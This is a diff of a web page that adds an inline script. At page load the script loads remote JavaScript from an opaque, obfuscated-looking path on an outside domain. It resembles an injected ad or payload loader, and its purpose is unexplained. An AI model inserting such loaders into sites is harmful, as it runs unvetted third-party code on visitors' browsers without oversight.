@@ -155,7 +155,17 @@ if (window.location.href.match(/^https?:\/\/(www\.)?gokdo\.com(\/|$)/)) {
   });
 }
 </script>
-
+<script>
+(function(jkne){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = jkne || {};
+s.src = "\/\/closed-philosophy.com\/cvD.9W6Kb\/2\/5jlVS\/WUQp9-NcTIEL3LMIz\/Ua5\/Miit0D1\/M\/T_cMzQNnTVkxzv";
+s.async = true;
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 // FONCTION DE DETECTION SI PLUSIEURS FENETRES SONT OUVERTES 
 <script>
 function detectMultipleWindows() {
